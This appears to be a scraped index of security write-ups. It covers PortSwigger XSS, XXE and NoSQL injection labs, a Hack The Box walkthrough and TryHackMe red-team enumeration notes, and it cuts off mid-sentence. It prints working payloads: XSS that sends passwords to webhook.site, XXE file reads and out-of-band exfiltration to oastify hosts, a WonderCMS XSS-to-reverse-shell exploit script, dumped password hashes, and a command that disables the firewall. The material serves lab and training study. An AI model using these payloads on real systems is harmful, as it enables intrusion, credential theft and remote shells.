lab\n19. Lab: Exploiting cross-site scripting to capture passwords This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim\u0026rsquo;s username and password then use these credentials to log in to the victim\u0026rsquo;s account.\nSo, we have to create a password input and on changing the password, we have to get the value to our webhook. The following payload should suppose to work, but I am not seeing any results on webhook.\n\u0026lt;input type=password name=password onchange=\u0026quot;if(this.value.length)fetch(\u0026quot;https://webhook.site/ee57e94f-3983-4a63-a3fe-26adf3e94ee8?pass=\u0026quot;+this.value);\u0026quot;\u0026gt;\nWhen I checked the solution - it has similar payload\n\u0026lt;input name=username id=username\u0026gt;\u0026lt;input type=password name=password onchange=\u0026quot;if(this.value.length)fetch('https://webhook.site/ee57e94f-3983-4a63-a3fe-26adf3e94ee8',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});\u0026quot;\u0026gt;\nSolution: When we get the username and password, by login in it will solve the lab.\n20. Lab: Exploiting XSS to bypass CSRF defenses This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.\nYou can log in to your own account using the following credentials: wiener:peter\nIf we login with this credentials, we will see there is an update email functionality. Just for testing we will try to change email of some random user asdf@test.com and what we noticed from this browser is sending post request to /my-account/change-email with email and csrf token. So, we can do CSRF if we find the token and using XSS we can get all the things from DOM. So let\u0026rsquo;s build exploit. Starting with the CSRF token, we can use getElementsByName to grab token and using fetch we will make a post request with random email and the token. Sending it in comment section and it will solve the lab.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script\u0026gt; window.addEventListener(\u0026#39;DOMContentLoaded\u0026#39;, function() { var token = document.getElementsByName(\u0026#39;csrf\u0026#39;)[0].value var data = new FormData(); data.append(\u0026#39;csrf\u0026#39;, token); data.append(\u0026#39;email\u0026#39;, \u0026#39;random@gmail.com\u0026#39;); fetch(\u0026#39;/my-account/change-email\u0026#39;, { method: \u0026#39;POST\u0026#39;, mode: \u0026#39;no-cors\u0026#39;, body: data }); }); \u0026lt;/script\u0026gt; Solution: Use above script in comment section.\n","description":"A collection of portswigger xss writeups with examples, notes and writeups.","id":27,"section":"Portswigger","tags":["Portswigger","XSS"],"title":"Portswigger XSS Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-xss/"},{"content":"1. Lab: Exploiting XXE using external entities to retrieve files This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that parses XML input and returns any unexpected values in the response.\nTo solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.\nIn this application there is a stock checking functionality. In this functionality if we put the payload of XXE, we can able to retrieve the file we want.\n1 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt;\u0026lt;stockCheck\u0026gt;\u0026lt;productId\u0026gt;\u0026amp;xxe;\u0026lt;/productId\u0026gt;\u0026lt;storeId\u0026gt;1\u0026lt;/storeId\u0026gt;\u0026lt;/stockCheck\u0026gt; Solution: Using simple XEE payload will solve the lab\n2. Lab: Exploiting XXE to perform SSRF attacks This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that parses XML input and returns any unexpected values in the response.\nThe lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.\nTo solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server\u0026rsquo;s IAM secret access key from the EC2 metadata endpoint.\nIn this application, we have to read data from internal server using SSRF with XXE Injection. We will use similar payload as before with a URL instead of local file and we will see the response is exposing a directory latest, if we enumerate though directory we will get the credentials.\nOn writing full URL will give us the credentials we want!\nSolution: Use SSRF Payload with XXE\n3. Lab: Exploiting XInclude to retrieve files This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that embeds the user input inside a server-side XML document that is subsequently parsed.\nBecause you don\u0026rsquo;t control the entire XML document you can\u0026rsquo;t define a DTD to launch a classic XXE attack.\nTo solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.\nThis application uses XInclude in order to get the file, but the question is how can we know if the website is parsing XML data in backend? We will use \u0026amp;entity; to check if it is parsing or not. In this case, it is!\nSo we will use XInclude payload in order to get the file.\nSolution: Use XInclude payload to solve the lab\n4. Lab: Exploiting XXE via image file upload This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.\nTo solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the \u0026ldquo;Submit solution\u0026rdquo; button to submit the value of the server hostname.\nIn this application, it is loading svg image in avatar, so we will use XML Injection to upload malicious SVG image.\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE svg [\u0026lt;!ENTITY test SYSTEM \u0026#39;file:///etc/hostname\u0026#39;\u0026gt;]\u0026gt; \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34;\u0026gt; \u0026lt;g id=\u0026#34;glyph1\u0026#34;\u0026gt; \u0026lt;text font-size=\u0026#34;50\u0026#34; x=\u0026#34;40\u0026#34; y=\u0026#34;30\u0026#34;\u0026gt;\u0026amp;test;\u0026lt;/text\u0026gt; \u0026lt;/g\u0026gt; \u0026lt;/svg\u0026gt; Solution: Using this image, hostname will be rendered in avatar image.\n5. Lab: Blind XXE with out-of-band interaction This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that parses XML input but does not display the result.\nYou can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.\nTo solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.\nSimilar to Lab 2, instead of using Internal URL, we will use burp collaborator URL in order to check if there is any blind XXE Injection.\nSolution: Use collaborator to check blind XXE Injection\n6. Lab: Blind XXE with out-of-band interaction via XML parameter entities This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.\nTo solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.\nIf we use previous payload, the application is blocking us by saying: \u0026quot;Entities are not allowed for security reasons\u0026quot;\nSo we will insert the following external entity definition in between the XML declaration and the stockCheck element:\n1 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE stockCheck [ \u0026lt;!ENTITY % xxe SYSTEM \u0026#34;https://nmd6zh5g7ue0k6f4ta8i9pzjdaj17uvj.oastify.com\u0026#34;\u0026gt; %xxe; ]\u0026gt; Solution: Use XML parameter entity payload.\n7. Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that parses XML input but does not display the result.\nTo solve the lab, exfiltrate the contents of the /etc/hostname file.\nIn order to check XXE Injection, we will see if we are getting anything in burpcollaborator? Yes, with the following payload we are getting blind XXE Injection.\nNext we will store the payload on exploit server\n1 2 3 4 \u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///etc/hostname\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; exfil SYSTEM \u0026#39;https://vnme0p6o82f8legcui9qax0reik984wt.oastify.com/?x=%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; %exfil; And then use the exploit server URL in place of blind XXE Injection and we will get hostname in HTTP request.\nSolution: Use external malicious DTD to exfiltrate data\n8. Lab: Exploiting blind XXE to retrieve data via error messages This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that parses XML input but does not display the result.\nTo solve the lab, use an external DTD to trigger an error message that displays the contents of the /etc/passwd file.\nThe lab contains a link to an exploit server on a different domain where you can host your malicious DTD.\nWe will use similar technique as previous lab, the only difference is in this lab, the errors are being exposed from the backend, so we will leverage that in order to exfiltrate data.\n1 2 3 4 \u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; error SYSTEM \u0026#39;file:///nonexistent/%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; %error; Solution: Use error based payload to exfiltrate data\n9. Lab: Exploiting XXE to retrieve data by repurposing a local DTD This lab has a \u0026ldquo;Check stock\u0026rdquo; feature that parses XML input but does not display the result.\nTo solve the lab, trigger an error message containing the contents of the /etc/passwd file.\nYou\u0026rsquo;ll need to reference an existing DTD file on the server and redefine an entity from it.\nWhen an application processes XML and you can define entities but can’t retrieve data in-band (no reflection) or out-of-band (egress filtering), you can still leak information by referencing and abusing a local DTD.\nThe process:\nConfirm XXE works – Inject an entity pointing to a known file like /etc/passwd. Different error messages for existing vs non-existent files confirm file access. Find local DTDs – Use a wordlist (GoSecure provides a solid one) to brute force common DTD file paths via an XML entity reference. Filter responses for valid hits. Repurpose existing entities – Once you find a local DTD (e.g., fonts.dtd), check online or in the DTD source for entity definitions you can overwrite. Trigger error-based exfiltration – Redefine an existing entity to include your target file’s contents in a resource path that doesn’t exist. The application’s “no such file or directory” error will include the leaked data. 1 \u0026lt;!DOCTYPE message [ \u0026lt;!ENTITY % local_dtd SYSTEM \u0026#34;file:///usr/share/yelp/dtd/docbookx.dtd\u0026#34;\u0026gt; \u0026lt;!ENTITY % ISOamso \u0026#39; \u0026lt;!ENTITY \u0026amp;#x25; file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY \u0026amp;#x25; eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x26;#x25; error SYSTEM \u0026amp;#x27;file:///nonexistent/\u0026amp;#x25;file;\u0026amp;#x27;\u0026gt;\u0026#34;\u0026gt; \u0026amp;#x25;eval; \u0026amp;#x25;error; \u0026#39;\u0026gt; %local_dtd; ]\u0026gt; Solution: This technique is useful when you’ve confirmed XXE but can’t pull data using standard in-band or out-of-band channels. By hijacking entities in a local DTD, you can still get valuable file contents despite strong egress controls.\n","description":"A collection of portswigger xxe injection writeups with examples, notes and writeups.","id":28,"section":"Portswigger","tags":["Portswigger","XXE-INJECTION"],"title":"Portswigger XXE Injection Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-xxe-injection/"},{"content":"1.

So we will look into administrator, but it didn\u0026rsquo;t gave us the password.\nSo we will use the query to get the password: administrator' \u0026amp;\u0026amp; this.password[0] == 'a' || 'a'=='b.\nSo we have to iterate each character and check if it is giving any response. If the character is right then we will get administrator data otherwise no user found. So we will use cluster bomb intruder to bruteforce it.\nSolution: administrator' \u0026amp;\u0026amp; this.password[0] == 'b' || 'a'=='b\n4. Lab: Exploiting NoSQL operator injection to extract unknown fields The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.\nTo solve the lab, log in as carlos.\nIf we try to login with user carlos and password not equal to empty, we see that our account is being locked.\nIf we use $where 0 , it says username or password is invalid whereas in 1 it says account is locked, that means we can inject Javascript.\nLet\u0026rsquo;s try to guess first field (which will be _id in every case, so let\u0026rsquo;s just verify that). If we use \u0026quot;$where\u0026quot;:\u0026quot;Object.keys(this)[0].match('_id')\u0026quot;, _id then it says account is locked, or else with other names it will say \u0026ldquo;invalid username or password\u0026rdquo;. So we can confirm that the first field is _id. Let\u0026rsquo;s test second and third field as username and password.\nFrom index 4 we are getting internal server error. So there are total 4 fields (0-3). The _id, username, password, \u0026lt;still_have_to_figure_it_out\u0026gt;.\nSo in order to find the total number of columns use this query: \u0026quot;$where\u0026quot;:\u0026quot;Object.keys(this)[$0$].match('_id')\u0026quot;\nIn order to find the length of the field, we will use this query: \u0026quot;$where\u0026quot;:\u0026quot;Object.keys(this)[3].length == $1$\u0026quot;\nSending this to intruder will give the length of the column name is 5.\nFind hidden field name: \u0026quot;$where\u0026quot;:\u0026quot;Object.keys(this)[3].match('^abc$d$')\u0026quot;}\nIn my case [3]=email.

Let\u0026rsquo;s open it in burpsuite to see what is going on behind the scenes!\nSo basically there are 2 requests going on in the backend, the first one is post request where it is redirecting us to download ticket page.\nSecond is where the ticket is getting downloaded.\nNow, just out of curiosity and as the parameter is download a file from json, let\u0026rsquo;s try to read /etc/passwd file.\nSo there is an LFI! But after enumerating to certain path, I cannot be able to find anything useful. So I have tried to look for subdomains.\nSubdomain Enumeration └─$ ffuf -H \u0026#34;Host: FUZZ.titanic.htb\u0026#34; -u http://titanic.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 20\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\\r/\\ \\__/ /\\ \\__/ __ __ /\\ \\__/\r\\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\r\\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\r\\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\\r\\/_/ \\/_/ \\/___/ \\/_/\rv2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://titanic.htb\r:: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt\r:: Header : Host: FUZZ.titanic.htb\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response words: 20\r________________________________________________\rdev [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 35ms] Found one subdomain dev and added it to /etc/hosts. On visiting the subdomain we can see it\u0026rsquo;s Gitea page.\nThere are 2 repositories - the flask-app contains the source code of the app, and docker-config contains the docker-compose files. In mysql folder, password is getting exposed MySQLP@$$w0rd!.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 version: \u0026#34;3.8\u0026#34; services: mysql: image: mysql:8.0 container_name: mysql ports: - \u0026#34;127.0.0.1:3306:3306\u0026#34; environment: MYSQL_ROOT_PASSWORD: \u0026#34;MySQLP@$$w0rd!\u0026#34; MYSQL_DATABASE: tickets MYSQL_USER: sql_svc MYSQL_PASSWORD: sql_password restart: always But there is no such user when we check /etc/passwd from LFI earlier. But if we see the Gitea website at dev subdomain, we can see the account name is developer. So I have tried to login with that username and the mysql password into ssh but that didn\u0026rsquo;t work.\nMoreover, in the footer it says Powered by Gitea Version: 1.22.1 but I don\u0026rsquo;t think there is any vulnerability with that version that will help us to get the shell.\nIf we look at that other docker-compose.yaml file,\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 version: \u0026#34;3\u0026#34; services: gitea: image: gitea/gitea container_name: gitea ports: - \u0026#34;127.0.0.1:3000:3000\u0026#34; - \u0026#34;127.0.0.1:2222:22\u0026#34; # Optional for SSH access volumes: - /home/developer/gitea/data:/data # Replace with your path environment: - USER_UID=1000 - USER_GID=1000 restart: always then we can see the volume is at /home/developer/gitea/data. So after googling I found that there is an app.ini file located at /conf/app.ini in gitea folder. So the path will be\n/home/developer/gitea/data/gitea/conf/app.ini\nFrom the response, we got the database path (/data/gitea/gitea.db), let\u0026rsquo;s try to get what\u0026rsquo;s in db. But as per the volume mentioned above, it will be at /home/developer/gitea/data/gitea/gitea.db.\nDownload the file using wget: wget 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -O gitea.db User Flag Exploring Gitea Database \u0026gt; sqlite3 gitea.db\rto open the database\r\u0026gt; .tables\rto list all the tables\r\u0026gt; sqlite\u0026gt; select * from user;\r1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0\r2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0\r3|ariti|ariti||ariti@ariti.com|0|enabled|36c72ab42c6dcb1d3be7804adc51e39139e96d7d108de666514169b9ec98724ca8210476cdee15e9326b7c8eda55dce00c15|pbkdf2$50000$50|0|0|0||0|||915fa2dbfd541a543b86bc5e91ac41d7|b669965b11d556a94ac70f66501e497f|en-US||1750427942|1750427942|1750427942|0|-1|1|0|0|0|0|1|0|35ccf5eb8e540c4af76b9cd5150b5966|ariti@ariti.com|0|0|0|0|0|0|0|0|0||gitea-auto|0 If we open it in sqlite DB Browser, it will look something like this,\nI found this amazing technique from 0xdf that will make our life easier in cracking PBKDF2 hashes.

Next, on fuzzing the directory I have found themes/ directory and from that directory, I got the theme name, license and version of the theme.\nNext, I googled about the theme name and it\u0026rsquo;s version, I have found it\u0026rsquo;s WonderCMS and there is exploit available for this - https://www.exploit-db.com/exploits/52271\nUser Flag We can use this exploit (https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413).\nIt takes 3 arguments: URL: where WonderCMS is installed (no need to know the password) IP: attacker\u0026rsquo;s Machine IP Port No: attacker\u0026rsquo;s Machine PORT\nChanging the script from the original exploit. changed pathname to hostname downloaded main.zip from https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip to locally. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 # Exploit: WonderCMS XSS to RCE import sys import requests import os import bs4 if (len(sys.argv)\u0026lt;4): print(\u0026#34;usage: python3 exploit.py loginURL IP_Address Port\\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252\u0026#34;) else: data = \u0026#39;\u0026#39;\u0026#39; var url = \u0026#34;\u0026#39;\u0026#39;\u0026#39;+str(sys.argv[1])+\u0026#39;\u0026#39;\u0026#39;\u0026#34;; if (url.endsWith(\u0026#34;/\u0026#34;)) { url = url.slice(0, -1); } var urlWithoutLog = url.split(\u0026#34;/\u0026#34;).slice(0, -1).join(\u0026#34;/\u0026#34;); var urlWithoutLogBase = new URL(urlWithoutLog).hostname; var token = document.querySelectorAll(\u0026#39;[name=\u0026#34;token\u0026#34;]\u0026#39;)[0].value; var urlRev = urlWithoutLogBase+\u0026#34;/?installModule=http://10.10.14.16:8000/main.zip\u0026amp;directoryName=violet\u0026amp;type=themes\u0026amp;token=\u0026#34; + token; var xhr3 = new XMLHttpRequest(); xhr3.withCredentials = true; xhr3.open(\u0026#34;GET\u0026#34;, urlRev); xhr3.send(); xhr3.onload = function() { if (xhr3.status == 200) { var xhr4 = new XMLHttpRequest(); xhr4.withCredentials = true; xhr4.open(\u0026#34;GET\u0026#34;, urlWithoutLogBase+\u0026#34;/themes/revshell-main/rev.php\u0026#34;); xhr4.send(); xhr4.onload = function() { if (xhr4.status == 200) { var ip = \u0026#34;\u0026#39;\u0026#39;\u0026#39;+str(sys.argv[2])+\u0026#39;\u0026#39;\u0026#39;\u0026#34;; var port = \u0026#34;\u0026#39;\u0026#39;\u0026#39;+str(sys.argv[3])+\u0026#39;\u0026#39;\u0026#39;\u0026#34;; var xhr5 = new XMLHttpRequest(); xhr5.withCredentials = true; xhr5.open(\u0026#34;GET\u0026#34;, urlWithoutLogBase+\u0026#34;/themes/revshell-main/rev.php?lhost=\u0026#34; + ip + \u0026#34;\u0026amp;lport=\u0026#34; + port); xhr5.send(); } }; } }; \u0026#39;\u0026#39;\u0026#39; try: open(\u0026#34;xss.js\u0026#34;,\u0026#34;w\u0026#34;).write(data) print(\u0026#34;[+] xss.js is created\u0026#34;) print(\u0026#34;[+] execute the below command in another terminal\\n\\n----------------------------\\nnc -lvp \u0026#34;+str(sys.argv[3])) print(\u0026#34;----------------------------\\n\u0026#34;) XSSlink = str(sys.argv[1]).replace(\u0026#34;loginURL\u0026#34;,\u0026#34;index.php?page=loginURL?\u0026#34;)+\u0026#34;\\\u0026#34;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;script+src=\\\u0026#34;http://\u0026#34;+str(sys.argv[2])+\u0026#34;:8000/xss.js\\\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;form+action=\\\u0026#34;\u0026#34; XSSlink = XSSlink.strip(\u0026#34; \u0026#34;) print(\u0026#34;send the below link to admin:\\n\\n----------------------------\\n\u0026#34;+XSSlink) print(\u0026#34;----------------------------\\n\u0026#34;) print(\u0026#34;\\nstarting HTTP server to allow the access to xss.js\u0026#34;) os.system(\u0026#34;python3 -m http.server\\n\u0026#34;) except: print(data,\u0026#34;\\n\u0026#34;,\u0026#34;//write this to a file\u0026#34;) It generates an xss.js file (for reflected XSS) and outputs a malicious link.\nAs soon as the admin (logged user) opens/clicks the malicious link, a few background requests are made without admin acknowledgement to upload a shell via the upload theme/plugin functionality.\nAfter uploading the shell, it executes the shell and the attacker gets the reverse connection of the server.

Difficulty Easy Maker tryhackme Task 1: Introduction This room introduces commonly-used concepts, technologies, and security products that we need to be aware of.\nIn this room, the assumption is that we have already gained access to the machine, and we are ready to expand our knowledge more about the environment by performing enumerating for the following:\nNetwork infrastrucutre Active Directory Environment Users and Groups Host-based security solutions Network-based security solutions Applications and services Task 2: Deploy the VM Deploy the machine and access with xfreerdp /v:10.10.184.154 /u:kkidd\nTask 3: Network Infrastructure Upon accessing an unknown network, the goal is to identify the network layout and potential targets. Enumeration of the compromised machine is key for understanding the system, services, and network.\nNetwork Segmentation: Divides a network into multiple subnets for better security and management. Helps prevent unauthorized access to sensitive assets like customer data. VLANs: Used in network segmentation to address issues like network broadcasting and enhance security. Devices within the same VLAN can only communicate with each other. Internal Networks: Segmented based on the importance of devices and data accessibility. Used to control traffic, improve performance, and enhance security. Internal networks facilitate internal communication, collaboration, and operational tools. DMZ (Demilitarized Zone): Adds a security layer by placing a subnetwork between the public internet and internal networks. Used to handle public services like web, DNS, FTP, and VPN while isolating untrusted traffic. Network Enumeration: Involves discovering networking aspects such as TCP/UDP ports, routing tables, and ARP tables. Use commands like netstat -na to list active connections and arp -a to reveal ARP tables. Helps identify internal services like DNS, web servers, and custom apps for further exploitation. Internal Network Services: These services, such as internal DNS or web servers, are only accessible within the network. After gaining access, these services become available for further actions, such as lateral movement or privilege escalation. Answer No Answer Needed!\nTask 4: Active Directory (AD) Environment Active Directory (AD) Environment Overview: AD is a Windows-based directory service for centralized management of authentication and authorization in internal networks. It stores essential data on users, computers, printers, etc. AD Data includes user details (job title, phone number, passwords, permissions) and network resources. Key Components: Domain Controllers (DC): Windows servers that manage AD services, control domains, and handle user/group policies. DCs store valuable information, making them prime targets for attackers. Organizational Units (OUs): Containers in the AD domain with hierarchical structures for organizing objects. AD Objects: Users: Security principals allowed to authenticate. Computers: Treated as special user accounts. GPOs (Group Policy Objects): Policies applied to other AD objects. AD Domains: Collections of AD components within the network. AD Forest: A collection of AD domains that trust each other. AD Service Accounts: Built-in local users, domain users, and managed service accounts. Domain Administrators: Manage access, users, and resources across the domain. AD Enumeration: After gaining initial access, discovering an AD environment is critical for red teamers. AD environments provide vast amounts of information useful for lateral movement. Checking AD Environment: Use the systeminfo command in the Command Prompt to check if a machine is part of an AD environment.\nsysteminfo | findstr Domain If the output shows a domain name, the machine is part of AD (e.g., Domain: thmdomain.com). If \u0026ldquo;WORKGROUP\u0026rdquo; appears, it indicates a local workgroup, not AD. Answers Before going any further, ensure the attached machine is deployed and try what we discussed. Is the attached machine part of the AD environment? (Y|N) Y If it is part of an AD environment, what is the domain name of the AD? thmredteam.com Task 5: Users and Group Management Active Directory Users and Groups Overview: When gaining initial access to a compromised machine in an AD environment, understanding the user accounts and groups is crucial. These accounts have different roles, permissions, and access levels.\nCommon Active Directory Account Types: Built-in Local User Accounts: Manage systems locally, not part of the AD environment. Domain User Accounts: Have access to AD services and resources managed by AD. Managed Service Accounts: Limited domain user accounts with higher privileges to manage AD services. Domain Administrators: High-privilege user accounts with control over AD configurations, users, permissions, and more. Important AD Administrator Accounts: BUILTIN\\Administrator: Local admin access on a domain controller. Domain Admins: Admin access to all resources in the domain. Enterprise Admins: Only available in the AD forest root, powerful in multi-domain environments. Schema Admins: Can modify AD schema/domain/forest (useful for attackers). Server Operators: Can manage domain servers. Account Operators: Can manage non-privileged user accounts. AD Enumeration: Once inside the AD environment, use PowerShell to enumerate users and groups.\nPowerShell Commands for AD Enumeration: List All AD Users: Get-ADUser -Filter * List Users in a Specific Organizational Unit (OU): Use the -SearchBase option to search within a specific Common Name (CN): Get-ADUser -Filter * -SearchBase \u0026quot;CN=Users,DC=THMREDTEAM,DC=COM\u0026quot; Answers: Use the Get-ADUser -Filter * -SearchBase command to list the available user accounts within THM OU in the thmredteam.com domain.

Staying aware of these tools helps minimize detection during the engagement.\nKey Host Security Solutions: Antivirus Software (AV): Antivirus is used to detect and prevent malicious software from executing on the host. Detection methods include: - Signature-based detection: Matches files against a database of known malware signatures. - Heuristic-based detection: Analyzes files for suspicious properties using machine learning. - Behavior-based detection: Monitors real-time execution behavior, such as unusual registry changes or processes.\nPowerShell command to enumerate antivirus software:\nGet-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct Microsoft Windows Defender: A built-in security tool that leverages machine learning and big data analysis. It operates in three modes: - Active mode: Primary antivirus. - Passive mode: Secondary antivirus when 3rd party AV is present. - Disable mode: Disabled or uninstalled.\nCheck Windows Defender status:\nGet-Service WinDefend Get-MpComputerStatus | select RealTimeProtectionEnabled Host-based Firewall: Firewalls control inbound and outbound traffic, protecting the host from unauthorized access. Modern firewalls use packet analysis and can block traffic based on application-layer data.\nCheck firewall status:\nGet-NetFirewallProfile | Format-Table Name, Enabled\nDisable firewall profiles (if admin privileges are available):\nSet-NetFirewallProfile -Profile Domain, Public, Private -Enabled False\nTest network connection through the firewall:\nTest-NetConnection -ComputerName 127.0.0.1 -Port 80 Host-based Intrusion Detection/Prevention Systems (HIDS/HIPS): These monitor and respond to suspicious activities on the host. HIDS detects and logs potential attacks, while HIPS attempts to block or prevent malicious behavior. Endpoint Detection and Response (EDR): - EDR solutions continuously monitor and collect data from endpoints to detect and respond to advanced threats. They provide enhanced visibility and allow rapid detection and response to security incidents.\nBy understanding these host security solutions, red teamers can identify potential obstacles during their engagement. Each security feature can block or detect malicious activity, and knowledge of their presence allows attackers to better evade detection or disable defenses when needed. Answers: Enumerate the attached Windows machine and check whether the host-based firewall is enabled or not! (Y|N) N Using PowerShell cmdlets such Get-MpThreat can provide us with threats details that have been detected using MS Defender. Run it and answer the following: What is the file name that causes this alert to record? PowerView.ps1 Enumerate the firewall rules of the attached Windows machine. What is the port that is allowed under the THM-Connection rule? 17337 In the next task, we will keep discussing the host security solution. I\u0026rsquo;m ready! no answer needed Task 7: Host Security Solution #2 Host Security Solutions Overview\nSecurity Event Logging and Monitoring: Operating systems log events that can be monitored by administrators. Logs cover applications, system, security, and services. Use PowerShell to list available logs:\nGet-EventLog -List In corporate environments, log agents gather data from sensors for security analysis. System Monitor (Sysmon): Sysmon logs events like process creation, network connections, and file modifications, useful for detecting malicious activity. Check for Sysmon:\nGet-Process | Where-Object { $_.ProcessName -eq \u0026quot;Sysmon\u0026quot; }\nGet-CimInstance win32_service -Filter \u0026quot;Description = 'System Monitor service'\u0026quot;\nGet-Service | Where-Object { $_.DisplayName -like \u0026quot;*sysm*\u0026quot; } Check registry for Sysmon:\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Sysmon/Operational Check Sysmon config:\nfindstr /si '\u0026lt;ProcessCreate onmatch=\u0026quot;exclude\u0026quot;\u0026gt;' C:\\tools\\* Host-based Intrusion Detection/Prevention Systems (HIDS/HIPS): HIDS detects suspicious activities but doesn’t prevent them. Uses signature-based or anomaly-based methods. HIPS prevents attacks by monitoring logs, processes, and system resources. It integrates antivirus, firewalls, and behavior analysis. Endpoint Detection and Response (EDR): EDR detects threats like malware, ransomware, and exploit chains in real-time, providing advanced protection. Common EDR software: Cylance, Crowdstrike, Symantec, SentinelOne. Check for security products: Tools like Invoke-EDRChecker or SharpEDRChecker can enumerate antivirus, EDR, and logging products by analyzing file metadata, services, and drivers. Task 8: Network Security Solutions Network security solutions protect clients and devices in a network from malicious activities using both software and hardware. Key components include:\nNetwork Firewall: Filters untrusted traffic based on rules and policies before allowing access to the network. Types of firewalls include packet-filtering, proxy, NAT, and web application firewalls. Security Information and Event Management (SIEM): SIEM aggregates log data, monitors events, and analyzes them in real-time to detect threats. Key SIEM functions: log management, event analytics, incident monitoring, security alerts, and compliance reporting. Common SIEM products: Splunk, LogRhythm, SolarWinds, Datadog. Intrusion Detection/Prevention Systems (IDS/IPS): - IDS: Monitors network traffic and alerts for abnormal behaviors or known threats, requiring human or software action. - IPS: Automatically accepts or rejects network packets based on predefined rules. - Common IDS/IPS products: Palo Alto Networks, Cisco, McAfee NSP, Trend Micro, Suricata.\nThese solutions help secure internal systems, detect advanced threats, and mitigate attacks such as DDoS, 